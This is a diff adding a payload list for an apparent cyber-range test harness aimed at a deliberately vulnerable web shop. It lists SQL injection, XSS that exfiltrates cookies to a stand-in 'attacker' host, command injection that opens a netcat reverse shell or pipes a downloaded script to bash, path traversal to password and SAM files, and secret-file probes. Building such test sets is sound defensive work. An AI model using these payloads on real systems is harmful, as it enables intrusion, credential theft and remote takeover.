@@ -1,0 +1,66 @@
+# Unified Attack Payloads for CyberRange
+# Format: method|endpoint|payload|expected_code|attack_chain_id|description
+# Attack Types: sql_injection, xss, command_injection, directory_traversal, auth_bypass, file_discovery, method_enumeration
+
+# ============================================
+# 1. SQL Injection Attacks
+# ============================================
+POST|/rest/user/login|{"email":"admin' OR '1'='1' --","password":"test"}|401|sql_001|Basic SQL injection
+POST|/rest/user/login|{"email":"admin'; DROP TABLE users; --","password":"test"}|401|sql_002|SQL injection with DROP
+POST|/rest/user/login|{"email":"admin' UNION SELECT username,password FROM users --","password":"test"}|401|sql_003|Union-based SQL injection
+POST|/api/Users|{"email":"test@test.com' AND SLEEP(5) --","password":"test123"}|400|sql_004|Time-based blind SQL injection
+GET|/rest/products/search?q=' OR 1=1 --||200|sql_005|Search parameter SQL injection
+
+# ============================================
+# 2. Cross-Site Scripting (XSS) Attacks
+# ============================================
+POST|/api/Feedbacks|{"comment":"<script>alert('XSS')</script>","rating":5}|201|xss_001|Basic XSS test
+POST|/api/Feedbacks|{"comment":"<img src=x onerror=alert('XSS')>","rating":5}|201|xss_002|Image-based XSS
+POST|/api/Feedbacks|{"comment":"<iframe src='javascript:alert(1)'></iframe>","rating":5}|201|xss_003|Iframe XSS
+POST|/profile|{"username":"<script>document.cookie</script>"}|200|xss_004|Cookie stealing attempt
+GET|/rest/products/search?q=<script>fetch('http://attacker:8080/steal?c='+document.cookie)</script>||200|xss_005|Advanced XSS with data exfiltration
+
+# ============================================
+# 3. Command Injection Attacks
+# ============================================
+POST|/rest/admin/application-configuration|{"serverName":"test; whoami"}|500|cmd_001|Basic command injection
+POST|/rest/admin/application-configuration|{"serverName":"test; cat /etc/passwd"}|500|cmd_002|File reading via command injection
+POST|/rest/admin/application-configuration|{"serverName":"test; nc -e /bin/bash attacker 4444"}|500|cmd_003|Reverse shell via command injection
+POST|/rest/admin/application-configuration|{"serverName":"test && curl http://attacker:8080/malware.sh | bash"}|500|cmd_004|Remote code execution
+POST|/rest/admin/application-configuration|{"serverName":"test | echo 'evil' > /tmp/backdoor"}|500|cmd_005|File write via command injection
+
+# ============================================
+# 4. Directory Traversal Attacks
+# ============================================
+GET|/ftp/..%2f..%2f..%2fetc%2fpasswd||404|dir_001|Basic directory traversal
+GET|/ftp/....//....//etc/passwd||404|dir_002|Double encoding traversal
+GET|/rest/products/1/reviews/../../../etc/shadow||404|dir_003|API endpoint traversal
+GET|/static/../../../../../../../windows/system32/config/sam||404|dir_004|Windows directory traversal
+GET|/download?file=../../../etc/hosts||404|dir_005|Parameter-based traversal
+
+# ============================================
+# 5. Authentication Bypass Attacks
+# ============================================
+POST|/rest/user/login|{"email":"admin@juice-sh.op","password":"admin123"}|401|auth_001|Default credential attempt
+POST|/rest/user/login|{"email":"' OR 1=1 --","password":""}|401|auth_002|SQL injection auth bypass
+POST|/rest/user/change-password|{"current":"test","new":"hacked","repeat":"hacked"}|401|auth_003|Password change without auth
+GET|/rest/wallet/balance||401|auth_004|Access protected endpoint without auth
+POST|/api/Users|{"email":"admin@admin.com","password":"weak"}|400|auth_005|User enumeration attempt
+
+# ============================================
+# 6. File Discovery/Information Disclosure
+# ============================================
+GET|/robots.txt||200|file_001|Robots file discovery
+GET|/.git/config||404|file_002|Git repository discovery
+GET|/backup.zip||404|file_003|Backup file discovery
+GET|/phpinfo.php||404|file_004|PHP info disclosure
+GET|/.env||404|file_005|Environment file disclosure
+
+# ============================================
+# 7. HTTP Method Enumeration
+# ============================================
+OPTIONS|/rest/user/login||204|method_001|OPTIONS method test
+TRACE|/rest/user/login||404|method_002|TRACE method test
+PUT|/rest/products/1|{"name":"Hacked Product"}|401|method_003|PUT method test
+DELETE|/rest/products/1||401|method_004|DELETE method test
+PATCH|/api/Users/1|{"role":"admin"}|401|method_005|PATCH method test
